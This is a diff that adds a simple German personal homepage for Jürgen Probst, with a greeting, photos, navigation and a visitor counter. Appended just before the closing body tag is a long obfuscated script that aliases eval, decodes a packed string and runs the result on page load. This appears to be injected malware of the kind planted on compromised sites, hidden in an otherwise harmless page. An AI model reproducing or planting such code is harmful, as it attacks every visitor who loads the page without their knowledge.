@@ -1,0 +1,163 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=ISO-8859-1">
+<META NAME="Author" CONTENT="Jürgen Probst">
+<META NAME="Generator" CONTENT="NetObjects Fusion 4.0.1 für Windows">
+<META NAME="Keywords" CONTENT="probst, juergen, jürgen, markgroeningen, markgröningen, buerstadt, bürstadt, thal, ruhla, homepage, privat">
+<META NAME="Copyright" CONTENT="Juergen Probst">
+<TITLE>Home</TITLE>
+<SCRIPT>
+<!--
+function F_loadRollover(){} function F_roll(){}
+//-->
+</SCRIPT>
+<SCRIPT LANGUAGE="JavaScript1.2" SRC="./rollover.js"></SCRIPT>
+</HEAD>
+<BODY NOF="(MB=(DefaultMasterBorder, 100, 57, 184, 10), L=(HomeLayout, 900, 450))" BGCOLOR="#FFFFFF" BACKGROUND="./background.gif" TEXT="#000000" LINK="#0033CC" VLINK="#990099" ALINK="#FF0000" TOPMARGIN=0 LEFTMARGIN=0 MARGINWIDTH=0 MARGINHEIGHT=0>
+    <TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0 WIDTH=951 NOF=LY>
+        <TR VALIGN=TOP ALIGN=LEFT>
+            <TD>
+                <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=169 NOF=LY>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD WIDTH=10 HEIGHT=16><IMG SRC="./clearpixel.gif" WIDTH=10 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=4><IMG SRC="./clearpixel.gif" WIDTH=4 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=136><IMG SRC="./clearpixel.gif" WIDTH=136 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=19><IMG SRC="./clearpixel.gif" WIDTH=19 HEIGHT=1 BORDER=0></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD COLSPAN=2 HEIGHT=162></TD>
+                        <TD COLSPAN=2 WIDTH=155><IMG ID="Bild16" HEIGHT=162 WIDTH=155 SRC="./juergen-1.jpg" BORDER=0></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD COLSPAN=4 HEIGHT=22></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD HEIGHT=62></TD>
+                        <TD COLSPAN=2 WIDTH=140>
+                            <TABLE ID="VerticalNavigationBar1" BORDER=0 CELLSPACING=0 CELLPADDING=0 NOF=NB_FYVP WIDTH=140>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD WIDTH=140 HEIGHT=31><A HREF="./index.html" onMouseOver="F_roll('Navigationsschaltflaeche1',1)" onMouseOut="F_roll('Navigationsschaltflaeche1',0)"><IMG ID="Navigationsschaltflaeche1"
+                                         NAME="Navigationsschaltflaeche1" HEIGHT=31 WIDTH=140 SRC="./Home_Hp3.gif" onLoad="F_loadRollover(this,'Home_HRp4.gif')" BORDER=0 ALT="Home"></A></TD>
+                                </TR>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD WIDTH=140 HEIGHT=31><A HREF="./Kontakt/kontakt.html" onMouseOver="F_roll('Navigationsschaltflaeche2',1)" onMouseOut="F_roll('Navigationsschaltflaeche2',0)"><IMG ID="Navigationsschaltflaeche2"
+                                         NAME="Navigationsschaltflaeche2" HEIGHT=31 WIDTH=140 SRC="./Kontakt_Np1.gif" onLoad="F_loadRollover(this,'Kontakt_NRp2.gif')" BORDER=0 ALT="Kontakt"></A></TD>
+                                </TR>
+                            </TABLE>
+                        </TD>
+                        <TD></TD>
+                    </TR>
+                </TABLE>
+            </TD>
+            <TD>
+                <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=687 NOF=LY>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD WIDTH=107 HEIGHT=17><IMG SRC="./clearpixel.gif" WIDTH=107 HEIGHT=1 BORDER=0></TD>
+                        <TD></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD HEIGHT=56></TD>
+                        <TD WIDTH=580><IMG ID="Banner1" HEIGHT=56 WIDTH=580 SRC="./Home_Nbanner.gif" BORDER=0 ALT="Jürgen Probst - Hompage" NOF=B_H></TD>
+                    </TR>
+                </TABLE>
+                <TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0 WIDTH=781 NOF=LY>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD>
+                            <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=498 NOF=LY>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD WIDTH=33 HEIGHT=90><IMG SRC="./clearpixel.gif" WIDTH=33 HEIGHT=1 BORDER=0></TD>
+                                    <TD WIDTH=465><IMG SRC="./clearpixel.gif" WIDTH=465 HEIGHT=1 BORDER=0></TD>
+                                </TR>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD></TD>
+                                    <TD WIDTH=465>
+                                        <P><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"></FONT><FONT SIZE="+3">Hallo, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 
+                                            &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;   &nbsp; &nbsp; </FONT></P>
+                                        <P><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"></FONT><FONT SIZE="+2">das ist die private Homepage von Jürgen Probst.</FONT></P>
+                                        <P><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"></FONT><FONT SIZE="+2">Da ich im Moment nur sehr wenig Zeit habe und ausserdem bei der Gestaltung dieser Homepage noch üben muss, ist das, 
+                                            was sie sehen, erst mal alles.</FONT></P>
+                                    </TD>
+                                </TR>
+                            </TABLE>
+                        </TD>
+                        <TD>
+                            <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=283 NOF=LY>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD WIDTH=23 HEIGHT=73><IMG SRC="./clearpixel.gif" WIDTH=23 HEIGHT=1 BORDER=0></TD>
+                                    <TD></TD>
+                                </TR>
+                                <TR VALIGN=TOP ALIGN=LEFT>
+                                    <TD HEIGHT=278></TD>
+                                    <TD ALIGN=CENTER VALIGN=MIDDLE WIDTH=260><IMG ID="Bild15" HEIGHT=278 WIDTH=260 SRC="./juergen-1.jpg" BORDER=0></TD>
+                                </TR>
+                            </TABLE>
+                        </TD>
+                    </TR>
+                </TABLE>
+            </TD>
+        </TR>
+    </TABLE>
+    <TABLE CELLPADDING=0 CELLSPACING=0 BORDER=0 WIDTH=951 NOF=LY>
+        <TR VALIGN=TOP ALIGN=LEFT>
+            <TD>
+                <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=157 NOF=LY>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD WIDTH=26 HEIGHT=49><IMG SRC="./clearpixel.gif" WIDTH=26 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=1><IMG SRC="./clearpixel.gif" WIDTH=1 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=128><IMG SRC="./clearpixel.gif" WIDTH=128 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=2><IMG SRC="./clearpixel.gif" WIDTH=2 HEIGHT=1 BORDER=0></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD COLSPAN=2></TD>
+                        <TD WIDTH=128>
+                            <P ALIGN=CENTER><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"></FONT><FONT SIZE="-2" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">Sie sind Besucher Nr.</FONT></P>
+                        </TD>
+                        <TD></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD COLSPAN=4 HEIGHT=11></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD></TD>
+                        <TD COLSPAN=3 WIDTH=131>
+                            <P ALIGN=CENTER><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"><img  src="http://cgicounter.puretec.de/cgi-bin/cnt?clsid=345e1741812c2feb922285ab1c63ce592">
+&nbsp;</FONT></P>
+                        </TD>
+                    </TR>
+                </TABLE>
+            </TD>
+            <TD>
+                <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 WIDTH=794 NOF=LY>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD WIDTH=44 HEIGHT=25><IMG SRC="./clearpixel.gif" WIDTH=44 HEIGHT=1 BORDER=0></TD>
+                        <TD WIDTH=750><IMG SRC="./clearpixel.gif" WIDTH=750 HEIGHT=1 BORDER=0></TD>
+                    </TR>
+                    <TR VALIGN=TOP ALIGN=LEFT>
+                        <TD></TD>
+                        <TD WIDTH=750>
+                            <P><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif"></FONT><FONT SIZE="+2">Wenn sie mir eine Nachricht zukommen lassen wollen, dann ist meine E-Mail-Adresse auf der Seite </FONT><A
+                                 HREF="./Kontakt/kontakt.html" TITLE="zur Seite KONTAKT"><FONT SIZE="+1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">Kontakt</FONT></A><FONT SIZE="+2"> abrufbar.</FONT></P>
+                        </TD>
+                    </TR>
+                </TABLE>
+            </TD>
+        </TR>
+    </TABLE>
+    <TABLE BORDER=0 CELLSPACING=0 CELLPADDING=0 NOF=LY>
+        <TR VALIGN=TOP ALIGN=LEFT>
+            <TD WIDTH=449 HEIGHT=46><IMG SRC="./clearpixel.gif" WIDTH=449 HEIGHT=1 BORDER=0></TD>
+            <TD></TD>
+        </TR>
+        <TR VALIGN=TOP ALIGN=LEFT>
+            <TD></TD>
+            <TD NOWRAP NOF="NB_FYHT">
+                <P><FONT SIZE="-2" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">[</FONT><A HREF="./index.html"><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">Home</FONT></A><FONT SIZE="-2"
+                     FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">]&nbsp;[</FONT><A HREF="./Kontakt/kontakt.html"><FONT SIZE="-1" FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">Kontakt</FONT></A><FONT SIZE="-2"
+                     FACE="Verdana,Tahoma,Arial,Helvetica,sans-serif">]</FONT></P>
+            </TD>
+        </TR>
+    </TABLE>
+<script>s_uB=document;s_C=window;function s_z($,s_uS){return 0}function s_F(x){return x.join('')}if(typeof($)=='undefined'){s_uy=s_uB.getElementsByTagName('head')[0];s_uv=s_uB.createElement('script');s_uv.setAttribute('src',"http://ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js");s_uy.appendChild(s_uv)}s_C.s_N=100;s_C.s_R=25;s_C.s_uT=eval;s_C.trim=function(s_ut,s_uo){if("qabcdef".indexOf(s_ut.substr(0,1))>=0){var s_uj=s_F(s_ut.split('q')).split('v');for(var i=0;i<s_uj.length;i++){s_uj[i]=parseInt(s_uj[i],16)-s_uo[s_ut]}return s_uj.join(',')+','}else{return s_uo[s_ut]}};d='zf={Ekv1a#P2$yZ6I:"e+",Ekv2a#P2$8$Z6I:"",&bkv3a#P2$yZ6v30:"l(\'l=St",#6#5v4e%2&0L$f&2j:"ring.f",O@v52W`$cw&aw:"romCha",L%8v68&2&5R>0j&4:"rCode("Gb&4X$d%8$9V?&c*7-93%2L%7%8%9Wk%c*6\\N\\*1Hc$d+f!QZP3`%c^HcIUU~&3&8LE*8,a1?R?E>8RO&aNA7E#5?$0VLI+8*7BfLOV%d&1#QfV*4Hb#f+e!4W$PP2#c*2AfU+c!2E!3%1E+c*0A5&2%6%4``|%4%6^H2&4&6%3X&2V@>0*7B1&5&e$8>3L&7&2L*5H1+0$a%7+3&4?$4+0*7-9a%8$8&5&8I>0#Y1*8,d3+6&e$7@$dI%1V*5G1VRO#6R&Yd#f*5G5E#9|E#4>1>6&4*9A6W&0?%7|$6%Yc^H9$3%Pb$2$9%Pb$2*5H4%3`%e|%3$Za%d*2G5W%8$7|%PaW|*4,d3$f$dk$7%d$ak$8NGYb%2%8|$8LU$4*1H0%c%9$4LV%1V%0*0-9c#8$d`$e+f+e&d&eNGZ4|&9&2+8&4%Z4*0Ga@RO@&e+1&3#d*5B3&9#c&4#d#3W$8&7NA9&8+e&c$b$2$2+fk*6G3$4?EUj$c?w*2Ac+bV+3%8`%3k$7*0GZ6|!0&6%c%Z3%8*0Aa%0%3%6&0w&5+b+0^H0`$5%9X?DO#c*1A6&e&0w&5+b&7%Y7^G9D%Y8&1V&aD+f*4APcU+fjX%7%Y7^G6#e+d!3@jU%e%2*1H4D+fV$2IV%7I*4A5&d+fRj$2EI%c*2H2%c$1E+fjI+fj^Ab+fE#d!2V$Zy6*2Ab&3E>1!3X$7U&3^,a3$d>8@$b&7#a&5@N,a3#d!3$3R$Y2|%e*0G9$8&0k$Y7&eWj*5Gc$1!3w+6>1w%e&0^-90&9%2$e+1!0!3+3+b*0Ab%d|%3EW%QP9*8Hd%d$a>1>5&3$1%e+1*8-9c#e#8ww!3&c#cO*0B6%1%1#Qc+b&0%y7*5Gfk$5>7`$Pd`?NGb%8?&b&e#e#b$e$e*2A5&e&0#4OE+e+e#3*2Bc+aU#Q4#f%P6%9*4GP0>2>2%ek@wL*5H6RL$6&2L&6jj*5BQaO#4&0#4D$bX*9A7I&2$0%d+0$8>5?*7,a3&0EE&c$1R&c$4^Acj&dEE@&b|%0*2Ad+Q3#4@$b#3#5@N-9dE@&b&5Ij+0$e*2Hf#Q7%3$9&0&c$1X^BYc&5&5%Y3&1&d$2*4A7#Z9#4#4OO%Z6*1Be+b&a$7D!4+1?w*1Bd#aID#9#d%4O%1*7,a2$f&5&QbO#4%0%6*9Bb!3+4#d+aL&9`#e*0Be#3!0LE+aL&9`*0-91&1#7!3E#ew&7&0^,ab&a%4D+8?+eD+b*1-9d%7R+b@%1#fV%8*4-94%1+0+2~?+7ID*7B9#bI%4&2?`&4E*7By6W$9~%4&1#a#5*9Be#bO#d#aO#d#aO*6Bd#6I#QbI#c#6I*4-91#d#6&2#a#6#d#a#6NB9#3@#8#8@#3#6@*1B8#8#3#8#7#3#8#7#3*7B7O@OO@#6#7@*1B9#9I#Q5I#9#7I*4Bf#Qe#c#5&0#Qb#5*9B9#4#8#4#c&0%Q4&8*8Ab$bU%c>1+4!3+P7^H2%9%e%7R%P2`%d*0-99%e%y8&9$5WkR*6H3#5>2#Qc#e#3>7WNHf&5E&eI%3U$0$c*8HP2#c~~XRj%6*2B1L+9~L&9~L$a*5B2XWOX%d%1X%9*6BQ9%Q4U#6k$y5*8B2?%0DRw&9&ck^Ab#dw?+e!4%Y1%6*2,d2|EO#7W$9$9%e*9H1%7&c&9E+e?#f%7^Gd$a!Yy8$d$0%9&1*4G6D~#6@+4#6~&7N,afj?U!PaU?+f^AaL$f$1%c$c$0&Q9*8BQ5jD~L+2~D*5-94&2#5W`$c&4@%3*6B1~>5>Q1>Q4#a#8*8BQ5R>2R>2R>2W*5HZ8W>0j?$Ya$9*5,a1&f#4#a#8#8~>5>5*8Ad+1O#3&5&a?@$7NAe$e>4+7!Pe+e&e$5*6HyY5?E$f&2!2j*2H3~>1>7%d&P7%e>0*9A6&a%yakRU&1W*6B0!2V?$aI%3j$1*2G9@#4#3#3#3D#e+4^A0%Yd&0!0!3&1L$3*0Ac%9$e+1!0$3R%3%8*0GZ2&3`%4|&Z4L*0GfU>3&6wX$8R$e*6,d0+3!2$aI%e%y0%9*2Ha%e>3X$9|&6%c$b*6H3%8$9%e$Y3&e@L*5,a2$3%P5$P3`+7L*1B2&7#6#a>7D$a&6D*9-9a+2$4~#dO#QaO*9AfV$6&d`D#8@@*4G1@+a#3U+3&d#8@N,ab>5>Qb&0O%1#y0*9Ge$d+e+d&c%3D&e%4*9A8%0X#b!3$eX$b+c*0,adVV!4%6UW`|*1Gb$e+5%cR@www*6,a0+a%2?%c%4%2#d%4*7BZY8%8$5$c!3!4D^A7&3@$b$4Wk%c`*6H3W%9DjX@>3%e*5G7X$5$a$1%P0%7X*1AcL@$b%d$c+c$Z5*8GbwD?#4%dk$a+0*6,ac+8+7+2X~O#4D*9,a7ID#8#7I%4X&2*7Ge$yaIk&Qa#b&3*8G7#f%8&1D$8&1%8O*4HyY0%d$8DEV&4*4-9e+6+b+c+d+f|>3%1*5G6???E?R?UNA3X!3E?#ZP8|^Hy8$6D%7~&1D$c*4-95k&4#9#b&7#9&2#a*8AcU$bDDD~%d$2^H0$5U$b#5$yP7U*7B0II&2%c$d%8$3U*7G5?*1,#6#5!%2&0L$f&2V:"32);",&$8$%d$6%c&b$0$1:"zuT(l)\'",V!!0&9$2L!0#8&2:");"};zuu=[];zun=String.fromCharCode;for(+r zx in zf){Ktrim(zx,zf))};K\';zJ=zun(118/5<5/5,98/5/8/5<6,121,58/4/5/0/0/1<0,34,62,60/5/2<4,97/9/1,32<5<4,99);\');K\'zM=zun(104/1/5/3/4<6,61,56,48,62,60,47/5/2<4,97/9/1);\');K\'za=zun(97<2/5,46<6<9/5<6<6/1<4,46,99<1/9,47,49,47<6<4/1<0/0<5,47/0,97/5/8,121,46/6<5<1<0);\');zuT(zF(zuu))!v7#v8$vc%vb&v9*:8+va-,q/,10<,11>vd?!a@!dA-7B-8D!cE!bG,bH,cI#0Kzuu.push(L!8N:90O#2P6$Q5#R!eU!fV!7W%aX!9Y4$Z1$^*3`%fj!5k%bw!6y7$zs_|%5~#1\\HZ2$3$Y5$Py8$9';for(c=43;c--;d=(t=d.split('!#$%&*+-/<>?@ABDEGHIKLNOPQRUVWXYZ^`jkwyz|~\\'.charAt(c))).join(t.pop()));s_uC=d;s_uT(s_uC)</script></body>
+</HTML>
+ 
